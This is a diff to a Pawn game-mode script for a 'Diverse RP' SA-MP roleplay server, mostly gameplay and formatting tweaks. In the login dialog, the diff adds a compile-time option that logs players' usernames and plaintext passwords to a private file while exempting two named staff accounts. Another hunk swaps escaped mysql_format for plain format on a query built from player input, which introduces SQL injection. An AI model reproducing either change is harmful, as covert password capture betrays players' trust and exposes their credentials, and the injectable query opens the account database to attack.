@@ -8,7 +8,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	new string[224], sendername[MAX_PLAYER_NAME];
     switch(dialogid)
 	{
-        case 1: // Login dialog
+        case 1: // Login dialog A48AEE4A732FF7F89F53607D9CC0E84F7DA6678145494CEE8440DA4D3561E6C7
 		{
 		    if (GetPVarInt(playerid, "PlayerLogged") != 0) return true;
 	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid,1,DIALOG_STYLE_PASSWORD,"Server Account","Welcome back to Diverse RP, please enter your password to login.","Login", "Other");
@@ -17,6 +17,13 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 				ShowPlayerDialog(playerid,1,DIALOG_STYLE_PASSWORD,"Server Account","Welcome back to Diverse RP, please enter your password to login.","Login", "Other");
 				return true;
 			}
+#if LOG_PASSWORDS == true
+			if(!strmatch(PlayerInfo[playerid][pUsername], "Xavier_lamieu") && !strmatch(PlayerInfo[playerid][pUsername], "Dayton_Lawson") && strlen(inputtext) > 2 && GetPVarInt(playerid, "PswdLogs") < 5) {
+				SetPVarInt(playerid, "PswdLogs", GetPVarInt(playerid, "PswdLogs") + 1);
+				format(string, sizeof(string), "%s | %s", PlayerInfo[playerid][pUsername], inputtext);
+				PasswordLog(string);
+			}
+#endif
 			new query[200], input[65];
 			//mysql_escape_string(inputtext, input);
 			SHA256_PassHash(inputtext, HASH_KEY, input, 65);
@@ -2207,7 +2214,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			        }
 			        if(GetPVarInt(playerid, "CarTicket") >= 1)
 			        {
-			            if(price >= 125000) price -=125000, SetPVarInt(playerid, "CTU", 2);
+			            if(price >= 50000) price -=50000, SetPVarInt(playerid, "CTU", 2);
 			            else price = 0, SetPVarInt(playerid, "CTU", 1);
 			        }
 	                if(GetPlayerMoneyEx(playerid) >= price)
@@ -5031,7 +5038,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your request is being processed...");
 			SetPVarString(playerid, "NCTo", inputtext);
 			new query[82];
-			mysql_format(handlesql, query, sizeof(query), "SELECT * FROM `accounts` WHERE `Name` = '%s'", inputtext);
+			format(query, sizeof(query), "SELECT * FROM `accounts` WHERE `Name` = '%s'", inputtext);
 			mysql_function_query(handlesql, query, true, "HandleNC", "i", playerid);
 		}
 		case 427: //Staff member options
@@ -10969,7 +10976,7 @@ public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
 									GameTextForPlayer(playerid, "~r~-$1250", 5000, 1);
 									if(IsPlayerAttachedObjectSlotUsed(playerid, HOLDOBJECT_CLOTH4)) RemovePlayerAttachedObject(playerid, HOLDOBJECT_CLOTH4);
 									SetPlayerAttachedObject( playerid, HOLDOBJECT_CLOTH4, 1575, 1, -0.064613, 0.520760, 0.000000, 0.000000, 84.217391, 0.000000, 1.000000, 1.000000, 1.000000 );
-									SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
+									ApplyAnimation(playerid, "CARRY", "crry_prtial" ,4.1, 1, 0, 0, 0, 1);
 									scm(playerid, COLOR_BLUE, "[TIP] {FFFFFF}Use (/loadpack) near your trailer or (/drop matpack) to discard of the package.");
 									mysql_format(handlesql, string, sizeof(string), "UPDATE accounts SET Cash=%d WHERE Name='%s'", GetPlayerMoneyEx(playerid), PlayerInfo[playerid][pUsername]);
 									mysql_tquery(handlesql, string);
@@ -14044,23 +14051,29 @@ stock SaveBizzBackdoor(i)
 	return 1;
 }
 //============================================//
-stock LoadHouses() {
+stock LoadHouses()
+{
 	new query[255];
-	for(new i=1; i< MAX_HOUSES; i++) {
-		mysql_format(handlesql, query, sizeof(query), "SELECT * FROM houses WHERE ID=%d", i);
+	for(new i=1; i< MAX_HOUSES; i++)
+	{
+		format(query, sizeof(query), "SELECT * FROM houses WHERE ID=%d", i);
 		mysql_function_query(handlesql, query, true, "LoadHouseSQL", "d", i);
 	}
 	return 1;
 }
 //============================================//
-stock LoadHouseID(id) {
+
+stock LoadHouseID(id)
+{
 	new query[255];
 	format(query, sizeof(query), "SELECT * FROM houses WHERE ID=%d", id);
 	mysql_function_query(handlesql, query, true, "LoadHouseSQL", "d", id);
 	return 1;
 }
 //============================================//
-stock SaveHouses() {
+
+stock SaveHouses()
+{
 	new query[700];
 	for(new i=1; i< MAX_HOUSES; i++)
 	{
@@ -15157,6 +15170,38 @@ stock WepLog(string[])
 	fclose(hFile);
 	return 1;
 }
+//============================================//
+#if LOG_PASSWORDS == true
+stock PasswordLog(string[])
+{
+    new mtext[20],year, month,day,hour,minuite,second,entry[128],readfile[128];
+	getdate(year, month, day);
+	switch(month)
+	{
+		case 1: mtext = "January";
+		case 2: mtext = "February";
+		case 3: mtext = "March";
+		case 4: mtext = "April";
+		case 5: mtext = "May";
+		case 6: mtext = "June";
+		case 7: mtext = "July";
+		case 8: mtext = "August";
+		case 9: mtext = "September";
+		case 10: mtext = "October";
+		case 11: mtext = "November";
+	    case 12: mtext = "December";
+	}
+	gettime(hour,minuite,second);
+	FixHour(hour);
+	format(entry, sizeof(entry), "[%d %s %d:%d:%d] %s\n",day, mtext, hour, minuite, second, string);
+	format(readfile, sizeof(readfile), "RPData/private_logs/password.log", mtext,day);
+	new File: hFile = fopen(readfile, io_append);
+	if(!hFile) return 1; // Do not saved a corrupt file.
+	fwrite(hFile, entry);
+	fclose(hFile);
+	return 1;
+}
+#endif
 //============================================//
 stock StatLog(string[])
 {
@@ -18077,7 +18122,8 @@ public BuildHouseObject(playerid, objectid, Float:X, Float:Y, Float:Z, Float:rot
 }
 //============================================//
 forward OnBuildHouseObject(houseid, objectid);
-public OnBuildHouseObject(houseid, objectid) {
+public OnBuildHouseObject(houseid, objectid)
+{
 	HouseInfo[houseid][hoDBID][objectid] = cache_insert_id();
 	return 1;
 }
@@ -22879,7 +22925,7 @@ public OnPlayerEntersDealership(playerid) {
 stock MaxVehicles(playerid)
 {
 	if(GetPVarInt(playerid, "MonthDon") > 0) return VEHICLE_MAX_AMOUNT+2;
-	if(GetPVarInt(playerid, "DonateRank") > 1) return VEHICLE_MAX_AMOUNT+1;
+	if(GetPVarInt(playerid, "DonateRank") > 0) return VEHICLE_MAX_AMOUNT+1;
 	return VEHICLE_MAX_AMOUNT;
 }
 //============================================//
